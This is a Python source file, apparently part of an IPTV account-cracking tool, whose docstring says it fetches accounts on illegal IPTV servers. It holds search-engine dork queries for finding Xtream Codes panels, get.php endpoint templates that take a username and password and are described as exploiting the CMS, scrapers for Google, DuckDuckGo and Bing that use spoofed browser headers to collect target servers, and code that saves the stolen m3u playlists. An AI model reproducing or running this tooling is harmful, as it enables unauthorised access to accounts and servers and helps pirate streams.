import os
import random
import time
import re
import json
from urllib.parse import urlparse
import requests
from googlesearch import search

"""Crawler
Class that handles the crawling process that fetch accounts on illegal IPTVs

Authors:
Claudio Ludovico (@Ludo237)
Pinperepette (@Pinperepette)
Arm4x (@Arm4x)
"""
class Crawler(object):
    # version
    version = "2.1.0"
    # output default directory
    outputDir = "output"
    # language default directory
    languageDir = "languages"
    # saved servers file
    savedServersFile = "saved_servers.json"
    # primary string used to exploit the CMS
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    # multiple format strings tested across different IPTV panel variants
    endpointTemplates = [
        "/get.php?username=%s&password=%s&type=m3u&output=mpegts",
        "/get.php?username=%s&password=%s&type=m3u&output=ts",
        "/get.php?username=%s&password=%s&type=m3u_plus",
        "/get.php?username=%s&password=%s&type=m3u_plus&output=ts"
    ]
    # expanded queries used to search IPTV servers across search engines
    searchQueries = [
        "Xtream Codes v1.0.59.5",
        "inurl:get.php?username= password= type=m3u",
        "inurl:c/ player_api.php",
        "inurl::8080/get.php?username=",
        "inurl::8000/get.php?username=",
        "inurl::25461/get.php?username=",
        "inurl:panel/get.php?username=",
        "xtream codes panel m3u get.php",
        "iptv server get.php?username=",
        "inurl:live/get.php?username="
    ]

    def __init__(self, language="en"):
        """Default constructor - Default to English"""
        self.language = "en"
        self.parsedUrls = []
        self.foundedAccounts = 0
        self.load_saved_servers()

    def load_saved_servers(self):
        """Load saved server list from disk JSON file"""
        if os.path.exists(self.savedServersFile):
            try:
                with open(self.savedServersFile, "r", encoding="utf-8") as f:
                    urls = json.load(f)
                    if isinstance(urls, list):
                        self.parsedUrls = urls
            except Exception as e:
                print(f"Error loading saved servers: {e}")

    def save_servers_to_disk(self):
        """Persist current server list to disk JSON file"""
        try:
            with open(self.savedServersFile, "w", encoding="utf-8") as f:
                json.dump(self.parsedUrls, f, indent=2)
            return True
        except Exception as e:
            print(f"Error saving servers: {e}")
            return False

    def add_custom_urls(self, text_or_list):
        """Allow manually adding multiple target server URLs from string/list"""
        if isinstance(text_or_list, str):
            raw_urls = re.split(r'[\r\n,;]+', text_or_list)
        elif isinstance(text_or_list, list):
            raw_urls = text_or_list
        else:
            return 0

        added_count = 0
        for raw in raw_urls:
            url = raw.strip()
            if not url:
                continue
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "http://" + url
            parsed = urlparse(url)
            clean_url = parsed.scheme + "://" + parsed.netloc
            if clean_url and clean_url not in self.parsedUrls:
                self.parsedUrls.append(clean_url)
                added_count += 1

        if added_count > 0:
            self.save_servers_to_disk()
        return added_count

    def add_custom_url(self, url):
        """Allow manually adding a single target server URL"""
        return self.add_custom_urls(url) > 0

    def remove_server_url(self, url):
        """Remove a server URL from list"""
        if url in self.parsedUrls:
            self.parsedUrls.remove(url)
            self.save_servers_to_disk()
            return True
        return False

    def clear_all_servers(self):
        """Clear all target servers from memory and disk"""
        self.parsedUrls = []
        self.save_servers_to_disk()
        return True

    def search_links(self, custom_query=None, limit=20):
        """Fetch IPTV server links strictly from live search engines"""
        queries = [custom_query] if custom_query else self.searchQueries
        found = 0
        target_limit = int(limit)

        # Method 1: Google Search API/Scraper
        for query in queries:
            try:
                for url in search(query, num_results=target_limit, timeout=8):
                    parsed = urlparse(url)
                    base_url = parsed.scheme + "://" + parsed.netloc
                    if base_url and base_url not in self.parsedUrls and "google" not in base_url:
                        self.parsedUrls.append(base_url)
                        found += 1
                    if len(self.parsedUrls) >= target_limit:
                        break
            except Exception as e:
                print(f"Google search error for query '{query}': {e}")
            if len(self.parsedUrls) >= target_limit:
                break

        # Method 2: DuckDuckGo Live HTML Search Engine Scraping
        if len(self.parsedUrls) < target_limit:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
                'Accept-Language': 'en-US,en;q=0.5'
            }
            for query in queries:
                try:
                    res = requests.get(f"https://html.duckduckgo.com/html/?q={query}", headers=headers, timeout=8)
                    if res.status_code == 200:
                        urls = re.findall(r'https?://[a-zA-Z0-9.-]+(?::[0-9]+)?', res.text)
                        for u in urls:
                            parsed = urlparse(u)
                            base_url = parsed.scheme + "://" + parsed.netloc
                            if base_url and "duckduckgo" not in base_url and base_url not in self.parsedUrls:
                                self.parsedUrls.append(base_url)
                                found += 1
                            if len(self.parsedUrls) >= target_limit:
                                break
                except Exception as e:
                    print(f"DuckDuckGo search error: {e}")
                if len(self.parsedUrls) >= target_limit:
                    break

        # Method 3: Bing Live Search Scraping
        if len(self.parsedUrls) < target_limit:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
            }
            for query in queries:
                try:
                    res = requests.get(f"https://www.bing.com/search?q={query}", headers=headers, timeout=8)
                    if res.status_code == 200:
                        urls = re.findall(r'https?://[a-zA-Z0-9.-]+(?::[0-9]+)?', res.text)
                        for u in urls:
                            parsed = urlparse(u)
                            base_url = parsed.scheme + "://" + parsed.netloc
                            if base_url and "bing.com" not in base_url and "microsoft.com" not in base_url and base_url not in self.parsedUrls:
                                self.parsedUrls.append(base_url)
                                found += 1
                            if len(self.parsedUrls) >= target_limit:
                                break
                except Exception as e:
                    print(f"Bing search error: {e}")
                if len(self.parsedUrls) >= target_limit:
                    break

        self.save_servers_to_disk()
        return found

    def create_file(self, row, newPath, fetched):
        """Create File"""
        if not os.path.exists(newPath):
            os.makedirs(newPath)
        filePath = os.path.join(newPath, f"tv_channels_{row.strip()}.m3u")
        with open(filePath, "w", encoding="utf-8") as outputFile:
            outputFile.write(fetched)
        self.foundedAccounts += 1

    def file_length(self, fileName):
        """File Length"""
        i = 0
        with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
            for i, _ in enumerate(f, start=1):
                pass
        return i
